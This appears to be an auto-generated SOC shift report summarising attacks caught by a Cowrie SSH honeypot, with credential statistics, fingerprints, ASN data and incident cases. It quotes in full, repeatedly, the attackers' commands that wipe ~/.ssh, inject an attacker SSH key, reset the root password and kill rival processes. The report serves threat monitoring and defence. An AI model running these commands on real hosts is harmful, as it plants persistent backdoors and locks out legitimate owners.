# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-06 |
| **Generated At** | 2026-06-06T21:09:15Z |
| **Shift Time** | 21:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **95** |
| Confirmed Threats | **91** |
| False Positives Filtered | **4** (4.2%) |
| Unique Attacker IPs | **12** |
| Countries of Origin | **8** |
| High Severity Cases | **16** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **79** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **32** |
| Unique Credential Pairs | **22** |
| Unique Usernames | **12** |
| Unique Passwords | **21** |
| Successful Auth Pairs | **13** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `345gs5662d34` | 6 |
| `alvin` | 1 |
| `deploy` | 1 |
| `mssql` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `123` | 2 |
| `alvin` | 1 |
| `asdzxc` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `alvin` | `alvin` | 1 |
| `deploy` | `asdzxc` | 1 |
| `mssql` | `mssql` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `iddqdidkfa` | `41.216.177.55` | 2026-06-06T19:32:04 |
| `root` | `3245gs5662d34` | `41.216.177.55` | 2026-06-06T19:32:07 |
| `root` | `Lucas@2025` | `41.216.177.55` | 2026-06-06T19:34:26 |
| `root` | `Wl123456` | `41.216.177.55` | 2026-06-06T19:41:26 |
| `root` | `123456789aA!` | `120.48.106.235` | 2026-06-06T19:45:28 |
| `root` | `1234567891` | `120.48.106.235` | 2026-06-06T19:52:19 |
| `root` | `qqq123456` | `120.48.106.235` | 2026-06-06T19:55:13 |
| `root` | `3245gs5662d34` | `120.48.106.235` | 2026-06-06T19:55:34 |
| `root` | `Wh123456..` | `120.48.106.235` | 2026-06-06T20:00:15 |
| `root` | `ankit@123` | `120.48.106.235` | 2026-06-06T20:01:17 |
| `root` | `root@2024` | `120.48.106.235` | 2026-06-06T20:05:09 |
| `root` | `Pass@2026` | `168.167.72.132` | 2026-06-06T20:51:45 |
| `root` | `3245gs5662d34` | `168.167.72.132` | 2026-06-06T20:51:52 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **95** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 55 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 33 | 1 |
| `f555226df196...` | Mirai/variant | 17 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 33 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 17 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:xxECwgmdhAje"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.106.235`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:X2oDjls2D92F"|chpasswd|bash
```
```
w
```
Source IPs: `120.48.106.235`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.106.235`, `41.216.177.55`, `168.167.72.132`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **12** |
| Unique ASNs | **10** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS58946` | GRAMEEN COMMUNICATIONS | 1 | HIGH |
| `AS3462` | Data Communication Business Group | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS135905` | VIETNAM POSTS AND TELECOMMUNICATIONS GROUP | 1 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | HIGH |
| `AS139989` | CV Atha Media Prima | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (16)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7fe6d02521ce

| Field | Detail |
|---|---|
| **Source IP** | `41.216.177[.]55` |
| **First Seen** | 2026-06-06 19:32 |
| **Last Seen** | 2026-06-06 19:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 19:32:03` | `cowrie.session.connect` |
| `2026-06-06 19:32:03` | `cowrie.client.version` |
| `2026-06-06 19:32:03` | `cowrie.client.kex` |
| `2026-06-06 19:32:04` | `cowrie.login.success` |
| `2026-06-06 19:32:04` | `cowrie.session.params` |
| `2026-06-06 19:32:04` | `cowrie.command.input` |
| `2026-06-06 19:32:04` | `cowrie.command.failed` |
| `2026-06-06 19:32:04` | `cowrie.log.closed` |
| `2026-06-06 19:32:04` | `cowrie.session.params` |
| `2026-06-06 19:32:04` | `cowrie.command.input` |
| `2026-06-06 19:32:04` | `cowrie.session.file_download` |
| `2026-06-06 19:32:04` | `cowrie.log.closed` |
| `2026-06-06 19:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.177[.]55` to AbuseIPDB if not already reported
- [ ] Block `41.216.177[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-777486efa1f6

| Field | Detail |
|---|---|
| **Source IP** | `41.216.177[.]55` |
| **First Seen** | 2026-06-06 19:32 |
| **Last Seen** | 2026-06-06 19:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 19:32:06` | `cowrie.session.connect` |
| `2026-06-06 19:32:06` | `cowrie.client.version` |
| `2026-06-06 19:32:06` | `cowrie.client.kex` |
| `2026-06-06 19:32:07` | `cowrie.login.success` |
| `2026-06-06 19:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.177[.]55` to AbuseIPDB if not already reported
- [ ] Block `41.216.177[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e048cf63d72b

| Field | Detail |
|---|---|
| **Source IP** | `41.216.177[.]55` |
| **First Seen** | 2026-06-06 19:34 |
| **Last Seen** | 2026-06-06 19:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 19:34:26` | `cowrie.session.connect` |
| `2026-06-06 19:34:26` | `cowrie.client.version` |
| `2026-06-06 19:34:26` | `cowrie.client.kex` |
| `2026-06-06 19:34:26` | `cowrie.login.success` |
| `2026-06-06 19:34:26` | `cowrie.session.params` |
| `2026-06-06 19:34:26` | `cowrie.command.input` |
| `2026-06-06 19:34:26` | `cowrie.command.failed` |
| `2026-06-06 19:34:27` | `cowrie.log.closed` |
| `2026-06-06 19:34:27` | `cowrie.session.params` |
| `2026-06-06 19:34:27` | `cowrie.command.input` |
| `2026-06-06 19:34:27` | `cowrie.session.file_download` |
| `2026-06-06 19:34:27` | `cowrie.log.closed` |
| `2026-06-06 19:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.177[.]55` to AbuseIPDB if not already reported
- [ ] Block `41.216.177[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-802f39a3e015

| Field | Detail |
|---|---|
| **Source IP** | `41.216.177[.]55` |
| **First Seen** | 2026-06-06 19:34 |
| **Last Seen** | 2026-06-06 19:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 19:34:28` | `cowrie.session.connect` |
| `2026-06-06 19:34:28` | `cowrie.client.version` |
| `2026-06-06 19:34:29` | `cowrie.client.kex` |
| `2026-06-06 19:34:29` | `cowrie.login.success` |
| `2026-06-06 19:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.177[.]55` to AbuseIPDB if not already reported
- [ ] Block `41.216.177[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5aae6ada3a2

| Field | Detail |
|---|---|
| **Source IP** | `41.216.177[.]55` |
| **First Seen** | 2026-06-06 19:41 |
| **Last Seen** | 2026-06-06 19:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 19:41:25` | `cowrie.session.connect` |
| `2026-06-06 19:41:25` | `cowrie.client.version` |
| `2026-06-06 19:41:25` | `cowrie.client.kex` |
| `2026-06-06 19:41:26` | `cowrie.login.success` |
| `2026-06-06 19:41:26` | `cowrie.session.params` |
| `2026-06-06 19:41:26` | `cowrie.command.input` |
| `2026-06-06 19:41:26` | `cowrie.command.failed` |
| `2026-06-06 19:41:26` | `cowrie.log.closed` |
| `2026-06-06 19:41:26` | `cowrie.session.params` |
| `2026-06-06 19:41:26` | `cowrie.command.input` |
| `2026-06-06 19:41:26` | `cowrie.session.file_download` |
| `2026-06-06 19:41:26` | `cowrie.log.closed` |
| `2026-06-06 19:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.177[.]55` to AbuseIPDB if not already reported
- [ ] Block `41.216.177[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74afc220b23b

| Field | Detail |
|---|---|
| **Source IP** | `41.216.177[.]55` |
| **First Seen** | 2026-06-06 19:41 |
| **Last Seen** | 2026-06-06 19:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 19:41:28` | `cowrie.session.connect` |
| `2026-06-06 19:41:28` | `cowrie.client.version` |
| `2026-06-06 19:41:28` | `cowrie.client.kex` |
| `2026-06-06 19:41:29` | `cowrie.login.success` |
| `2026-06-06 19:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.177[.]55` to AbuseIPDB if not already reported
- [ ] Block `41.216.177[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7921a49b393

| Field | Detail |
|---|---|
| **Source IP** | `120.48.106[.]235` |
| **First Seen** | 2026-06-06 19:45 |
| **Last Seen** | 2026-06-06 19:46 |
| **Session Duration** | 60s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:X2oDjls2D92F"|chpasswd|bash, w` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 19:45:24` | `cowrie.session.connect` |
| `2026-06-06 19:45:24` | `cowrie.client.version` |
| `2026-06-06 19:45:24` | `cowrie.client.kex` |
| `2026-06-06 19:45:28` | `cowrie.login.success` |
| `2026-06-06 19:45:30` | `cowrie.session.params` |
| `2026-06-06 19:45:30` | `cowrie.command.input` |
| `2026-06-06 19:45:30` | `cowrie.command.failed` |
| `2026-06-06 19:45:31` | `cowrie.log.closed` |
| `2026-06-06 19:45:32` | `cowrie.session.params` |
| `2026-06-06 19:45:32` | `cowrie.command.input` |
| `2026-06-06 19:45:35` | `cowrie.session.file_download` |
| `2026-06-06 19:45:35` | `cowrie.log.closed` |
| `2026-06-06 19:45:43` | `cowrie.session.params` |
| `2026-06-06 19:45:43` | `cowrie.command.input` |
| `2026-06-06 19:45:44` | `cowrie.log.closed` |
| `2026-06-06 19:45:46` | `cowrie.session.params` |
| `2026-06-06 19:45:46` | `cowrie.command.input` |
| `2026-06-06 19:46:16` | `cowrie.log.closed` |
| `2026-06-06 19:46:17` | `cowrie.session.params` |
| `2026-06-06 19:46:17` | `cowrie.command.input` |
| `2026-06-06 19:46:17` | `cowrie.log.closed` |
| `2026-06-06 19:46:18` | `cowrie.session.params` |
| `2026-06-06 19:46:18` | `cowrie.command.input` |
| `2026-06-06 19:46:18` | `cowrie.log.closed` |
| `2026-06-06 19:46:18` | `cowrie.session.params` |
| `2026-06-06 19:46:18` | `cowrie.command.input` |
| `2026-06-06 19:46:19` | `cowrie.log.closed` |
| `2026-06-06 19:46:19` | `cowrie.session.params` |
| `2026-06-06 19:46:19` | `cowrie.command.input` |
| `2026-06-06 19:46:20` | `cowrie.log.closed` |
| `2026-06-06 19:46:20` | `cowrie.session.params` |
| `2026-06-06 19:46:20` | `cowrie.command.input` |
| `2026-06-06 19:46:20` | `cowrie.log.closed` |
| `2026-06-06 19:46:21` | `cowrie.session.params` |
| `2026-06-06 19:46:21` | `cowrie.command.input` |
| `2026-06-06 19:46:21` | `cowrie.log.closed` |
| `2026-06-06 19:46:22` | `cowrie.session.params` |
| `2026-06-06 19:46:22` | `cowrie.command.input` |
| `2026-06-06 19:46:22` | `cowrie.log.closed` |
| `2026-06-06 19:46:23` | `cowrie.session.params` |
| `2026-06-06 19:46:23` | `cowrie.command.input` |
| `2026-06-06 19:46:23` | `cowrie.log.closed` |
| `2026-06-06 19:46:24` | `cowrie.session.params` |
| `2026-06-06 19:46:24` | `cowrie.command.input` |
| `2026-06-06 19:46:24` | `cowrie.log.closed` |
| `2026-06-06 19:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.106[.]235` to AbuseIPDB if not already reported
- [ ] Block `120.48.106[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4123186da478

| Field | Detail |
|---|---|
| **Source IP** | `120.48.106[.]235` |
| **First Seen** | 2026-06-06 19:52 |
| **Last Seen** | 2026-06-06 19:53 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:xxECwgmdhAje"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 19:52:17` | `cowrie.session.connect` |
| `2026-06-06 19:52:17` | `cowrie.client.version` |
| `2026-06-06 19:52:18` | `cowrie.client.kex` |
| `2026-06-06 19:52:19` | `cowrie.login.success` |
| `2026-06-06 19:52:24` | `cowrie.session.params` |
| `2026-06-06 19:52:24` | `cowrie.command.input` |
| `2026-06-06 19:52:24` | `cowrie.command.failed` |
| `2026-06-06 19:52:26` | `cowrie.log.closed` |
| `2026-06-06 19:52:29` | `cowrie.session.params` |
| `2026-06-06 19:52:29` | `cowrie.command.input` |
| `2026-06-06 19:52:29` | `cowrie.session.file_download` |
| `2026-06-06 19:52:29` | `cowrie.log.closed` |
| `2026-06-06 19:52:42` | `cowrie.session.params` |
| `2026-06-06 19:52:42` | `cowrie.command.input` |
| `2026-06-06 19:52:42` | `cowrie.log.closed` |
| `2026-06-06 19:52:47` | `cowrie.session.params` |
| `2026-06-06 19:52:47` | `cowrie.command.input` |
| `2026-06-06 19:52:48` | `cowrie.log.closed` |
| `2026-06-06 19:52:48` | `cowrie.session.params` |
| `2026-06-06 19:52:48` | `cowrie.command.input` |
| `2026-06-06 19:52:49` | `cowrie.session.file_download` |
| `2026-06-06 19:52:49` | `cowrie.log.closed` |
| `2026-06-06 19:52:50` | `cowrie.session.params` |
| `2026-06-06 19:52:50` | `cowrie.command.input` |
| `2026-06-06 19:52:50` | `cowrie.log.closed` |
| `2026-06-06 19:52:51` | `cowrie.session.params` |
| `2026-06-06 19:52:51` | `cowrie.command.input` |
| `2026-06-06 19:52:54` | `cowrie.log.closed` |
| `2026-06-06 19:52:54` | `cowrie.session.params` |
| `2026-06-06 19:52:54` | `cowrie.command.input` |
| `2026-06-06 19:52:54` | `cowrie.command.input` |
| `2026-06-06 19:52:54` | `cowrie.log.closed` |
| `2026-06-06 19:52:55` | `cowrie.session.params` |
| `2026-06-06 19:52:55` | `cowrie.command.input` |
| `2026-06-06 19:52:55` | `cowrie.log.closed` |
| `2026-06-06 19:52:56` | `cowrie.session.params` |
| `2026-06-06 19:52:56` | `cowrie.command.input` |
| `2026-06-06 19:52:56` | `cowrie.log.closed` |
| `2026-06-06 19:52:57` | `cowrie.session.params` |
| `2026-06-06 19:52:57` | `cowrie.command.input` |
| `2026-06-06 19:52:57` | `cowrie.log.closed` |
| `2026-06-06 19:52:57` | `cowrie.session.params` |
| `2026-06-06 19:52:57` | `cowrie.command.input` |
| `2026-06-06 19:52:58` | `cowrie.log.closed` |
| `2026-06-06 19:52:58` | `cowrie.session.params` |
| `2026-06-06 19:52:58` | `cowrie.command.input` |
| `2026-06-06 19:52:59` | `cowrie.log.closed` |
| `2026-06-06 19:52:59` | `cowrie.session.params` |
| `2026-06-06 19:52:59` | `cowrie.command.input` |
| `2026-06-06 19:52:59` | `cowrie.log.closed` |
| `2026-06-06 19:53:00` | `cowrie.session.params` |
| `2026-06-06 19:53:00` | `cowrie.command.input` |
| `2026-06-06 19:53:00` | `cowrie.log.closed` |
| `2026-06-06 19:53:01` | `cowrie.session.params` |
| `2026-06-06 19:53:01` | `cowrie.command.input` |
| `2026-06-06 19:53:01` | `cowrie.log.closed` |
| `2026-06-06 19:53:02` | `cowrie.session.params` |
| `2026-06-06 19:53:02` | `cowrie.command.input` |
| `2026-06-06 19:53:02` | `cowrie.log.closed` |
| `2026-06-06 19:53:03` | `cowrie.session.params` |
| `2026-06-06 19:53:03` | `cowrie.command.input` |
| `2026-06-06 19:53:03` | `cowrie.log.closed` |
| `2026-06-06 19:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.106[.]235` to AbuseIPDB if not already reported
- [ ] Block `120.48.106[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
